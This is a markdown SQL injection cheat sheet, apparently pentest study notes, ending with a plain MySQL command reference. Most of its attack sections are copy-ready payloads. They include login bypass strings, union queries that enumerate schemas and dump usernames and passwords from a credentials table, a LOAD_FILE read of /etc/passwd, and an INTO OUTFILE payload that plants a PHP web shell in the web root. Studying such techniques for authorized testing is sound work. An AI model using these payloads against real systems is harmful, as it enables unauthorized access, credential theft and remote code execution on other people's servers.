# <a id="top-of-page"></a> SQL Injection

### Links

- [SQL Injections](#sqli)
  - [General SQLi Info](#sqli-gen)
    - Cheat Sheets
    - Automated Tools
    - In-Band/Inline SQLi
    - Blind SQLi
  - [SQL Comments](#sqli-comm)
  - [String Injections]()
  - [Auth Bypass](#sqli-auth)
  - [Union Injection](#sqli-union)
    - Using ORDER BY
    - Using UNION
    - Using UNION + NULL
  - [Stacked Queries](#sqli-stack)
  - [DB Enumeration](#sqli-enum)
  - [Reading/Writing Files](#sqli-rw)
- [General Commands](#mysql)
  - [SQL Special Characters](#sql-spec)
  - [SQL Data Types](#sql-data)

# <a id="sqli"></a> SQL Injections

## <a id="sqli-gen"></a> -General SQLi Info-

### --Cheat Sheets--

- [WebSec SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection)
- [pentestmonkey SQL Injection](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
- [SQL Injection Wiki](https://sqlwiki.netspi.com/)
- [Invicti SQL Injection](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)

### --Automated Tools--

- [sqlmap]()

## Add link to SQLMAP CHEETSHEET

SQLi flaws are really just one vulnerability, however this vulnerability appears in different ways. Although categorizing the types of vulnerabilities into 'Visible' vs 'Blind' is simplistic, it works as a generalization.

- In-Band/Inline SQLi
- Blind SQLi

### --In-Band/Inline SQLi--

This flaw type allows the attacker to see the results of their injections, which makes SQLi simpler to discover and easier to exploit. Examples of this would be seeing DB errors, Custom Error messages (from App), successful results of injection attempts.

### --Blind SQL Injection--

This flaw type has variance in how it can appear, but the gist of the flaw is that no obvious behavioral change occurs when a SQLi attempt is made.

Some techniques that can be used to test this type of flaw are below:

- Binary/Boolean Inference Testing
- Blind Timing Inferences
- Out-of-Band Channels

**---Binary/Boolean Inference Testing--**

The goal here is to use string injection to test which things return values, and which do not. The usage here is to 'infer' when a query that has been built is actually manipulating the backend DBMS.

_Test that the employee data is returned successfully_

```
Dent' AND 1;#
Dent' AND 1=1;#
```

_Test that the employee data is not returned successfully_

```
'
Dent' AND 1;#
Dent' AND 1=0;#
```

_Find table names in the database_

```
The letter represents the characters that might exist in the table name

Dent' AND substr((select table_name from information_schema.tables limit 1), 1, 1) > "a";#
```

**---Blind Timing Inferences---**

_Change the responsiveness of the application_

```
Sleep(10) - MySQL
WAITFOR DELAY '0:0:10' - MS SQL

Other DBMS options available, but this technique is usually automated (sqlmap)
```

**---Out-of-Band---**

This technique generally requires the use of DNS or HTTP to tunnel comms back to a server under attacker's control. This will need to be researched on a case-by-case basis.

</br>

## <a id="sqli-comm"></a> -SQL Comments-

Comments in SQL can be any of the below options, it is important to evaluate and test all of these options when exploring SQLi.

| **Payload** | **URL Encoded**                                                       |
| ----------- | --------------------------------------------------------------------- |
| `-- -`      | Line comment (sometimes needs a space after it shown by extra dash)   |
| `#`         | Line comment                                                          |
| `/**/`      | In-Line command, not normally used but can be to bypass other filters |

</br>

## <a id="sqli-string"></a> -String Injections-

| **Prefix** | **Suffix** | **Note**                                                                                                    |
| ---------- | ---------- | ----------------------------------------------------------------------------------------------------------- |
| `Dent'`    | `;#`       | Commenting: Close string, statement, and comment rest of code out                                           |
| `Dent'`    | `;--`      | Commenting: Close string, statement, and comment rest of code out. Space following dashes possible required |
| `De'/*`    | `*/'nt`    | Inline Commenting: Close string, statement, and comment rest of code out                                    |
| `De'`      | `'nt`      | Concatenation: Attempt with and without a space between                                                     |
| `De'\|`    | `\|'nt`    | Concatenation: Additional style of concatenation                                                            |

</br>

## <a id="sqli-auth"></a> -Auth Bypass-

To test whether the login form is vulnerable to SQL injection, try to add one of the below payloads after the username and see if it causes any errors or changes how the page behaves:

| **Payload** | **URL Encoded** |
| ----------- | --------------- |
| `'`         | `%27`           |
| `"`         | `%22`           |
| `#`         | `%23`           |
| `;`         | `%3B`           |
| `)`         | `%29`           |

If the app is vulnerable, use the below Auth bypass options to attempt to login:

| **Payload**                                                                                                                   | **Description**                 |
| ----------------------------------------------------------------------------------------------------------------------------- | ------------------------------- |
| **Auth Bypass**                                                                                                               |
| `admin' or '1'='1`                                                                                                            | Basic Auth Bypass               |
| `admin')-- -`                                                                                                                 | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |

</br>

## <a id="sqli-union"></a> -Union Injection-

When considering Union injection, it is important to remember that a UNION statement on SELECT statements only works with even columns. For example, if an attempt is made to create a UNION on two queries with a different number of columns an error like below appears:

```
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

There are two ways detect the number of columns that will be needed for the injection:

- Using ORDER BY
- Using UNION
- Using UNION + NULL

### --Using ORDER BY--

The first way of detecting the number of columns is through the ORDER BY function. Inject a query that sorts the results by a column specified, 'i.e., column 1, column 2, and so on', until an error appears saying the column specified does not exist.

For example, start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then do order by 2 and then order by 3 until a number that returns an error, or the page does not show any output, which means that this column number does not exist.

_The extra dash is to show a space at the end of the statement_

```
 order by 1-- -
```

### --Using UNION--

The other method is to attempt a Union injection with a different number of columns until results are returned. The ORDER BY method always returns the results until an error occurs, while this method always gives an error until a success.

_The extra dash is to show a space at the end of the statement_

```
UNION select 1,2,3-- -
```

| **Payload**                                         | **Description**                                |
| --------------------------------------------------- | ---------------------------------------------- |
| `' order by 1-- -`                                  | Detect number of columns using `order by`      |
| `cn' UNION select 1,2,3-- -`                        | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -`              | Basic Union injection                          |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns                  |

### --Using UNION + NULL--

FROMless SELECT + NULL will help clear the way for some UNION SELECTs against arbitrary tables.

The below example is to try and find the number of columns for a DB.

```
Dent' UNION SELECT NULL;--
Dent' UNION SELECT NULL, NULL;--
Dent' UNION SELECT NULL, NULL, NULL;--
Dent' UNION SELECT NULL, NULL, NULL, NULL;--
```

The first three above queries would result in the below error, but the fourth would return NULL results.

```
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

The next step after a successful query is to find a field that allows string input to be returned. This can be done by building on the above successful query by passing a string number '42' in each field until results are returned.

```
Dent' UNION SELECT '42', NULL, NULL, NULL;--
```

</br>

## <a id="sqli-stack"></a> -Stacked Queries-

Stacked queries, or query stacking, means multiple SQL queries can be submitted simply by splitting them with a semicolon. Support for stacked queries is difficult to ascertain. The most likely RDBMS to support this is MS SQL Server. MySQL technially supports it, but the way the application interfaces with the DB may interfer with this.

| **Payload**                                         | **Description**                  |
| --------------------------------------------------- | -------------------------------- |
| `Dent'; CREATE TABLE exfil(data varchar(1000));-- ` | Create a new table to exfil data |

</br>

## <a id="sqli-enum"></a> -DB Enumeration-

Before enumerating a DB, it is important to identify what type of DBMS is being used. There are ways to fingerprint a DB, which can be found [HERE](https://www.sqlinjection.net/database-fingerprinting/).

_The payloads below are geared towards a MySQL DB, other payloads will be needed for other DBs_

| **Payload**                                                                                                                 | **Description**                            |
| --------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| `SELECT @@version`                                                                                                          | Fingerprint MySQL with query output        |
| `SELECT SLEEP(5)`                                                                                                           | Fingerprint MySQL with no output           |
| `cn' UNION select 1,database(),2,3-- -`                                                                                     | Current database name                      |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                   | List all databases                         |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                  | List all tables in a specific database     |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table       |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                        | Dump data from a table in another database |

</br>

## <a id="sqli-rw"></a> -Reading/Writing Files-

In addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files. So start by gathering data about the user privileges within the database to decide whether reading and/or writing files to the back-end server, is possible.

The secure_file_priv variable is used to determine where to read/write files from. An empty value allows reading files from the entire file system. Otherwise, if a certain directory is set, reading is only done from the folder specified by the variable. On the other hand, NULL means read/write is not possible from any directory. MariaDB has this variable set to empty by default, which allows read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder, which means that reading files through a MySQL injection isn't possible with default settings.

| **Payload**                                                                                                                                | **Description**                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -`                  | Find if all user privileges                          |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Read local file                                      |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                               | Write a string to a local file                       |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Write a web shell into the base web directory        |

[Back to top](#top-of-page)

</br>

# <a id="mysql"></a> General Commands

| **Command**                                                       | **Description**                                          |
| ----------------------------------------------------------------- | -------------------------------------------------------- |
| **General**                                                       |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`                | login to mysql database                                  |
| `SHOW DATABASES`                                                  | List available databases                                 |
| `USE users`                                                       | Switch to database                                       |
| **Tables**                                                        |
| `CREATE TABLE logins (id INT, ...)`                               | Add a new table                                          |
| `SHOW TABLES`                                                     | List available tables in current database                |
| `DESCRIBE logins`                                                 | Show table properties and columns                        |
| `INSERT INTO table_name VALUES (value_1,..)`                      | Add values to table                                      |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table                |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`  | Update table values                                      |
| **Columns**                                                       |
| `SELECT * FROM table_name`                                        | Show all columns in a table                              |
| `SELECT column1, column2 FROM table_name`                         | Show specific columns in a table                         |
| `DROP TABLE logins`                                               | Delete a table                                           |
| `ALTER TABLE logins ADD newColumn INT`                            | Add new column                                           |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`         | Rename column                                            |
| `ALTER TABLE logins MODIFY oldColumn DATE`                        | Change column datatype                                   |
| `ALTER TABLE logins DROP oldColumn`                               | Delete column                                            |
| **Output**                                                        |
| `SELECT * FROM logins ORDER BY column_1`                          | Sort by column                                           |
| `SELECT * FROM logins ORDER BY column_1 DESC`                     | Sort by column in descending order                       |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`             | Sort by two-columns                                      |
| `SELECT * FROM logins LIMIT 2`                                    | Only show first two results                              |
| `SELECT * FROM logins LIMIT 1, 2`                                 | Only show first two results starting from index 2        |
| `SELECT * FROM table_name WHERE <condition>`                      | List results that meet a condition                       |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`               | List results where the name is similar to a given string |

## <a id="sql-spec"></a> -SQL Special Characters-

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and Subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

| **Payload**    | **URL Encoded**                            |
| -------------- | ------------------------------------------ |
| `', "`         | String delimiter                           |
| `;`            | Terminates a SQL statement                 |
| `-- , #, /**/` | Comment delimiters                         |
| `%, *`         | Wildcard characters                        |
| `\|\|, +, " "` | String concatenation characters            |
| `+, <, >, =`   | Mathmematical operators                    |
| `=`            | Test for equivalence                       |
| `( )`          | Calling functions, subqueries, and INSERTS |
| `%00`          | Null byte                                  |

## <a id="sql-data"></a> -SQL Data Types-

- bool - Boolean True/False
- int - Integer
- char - Fixed length string
- varchar - Variable length string
- binary

[Back to top](#top-of-page)

</br>
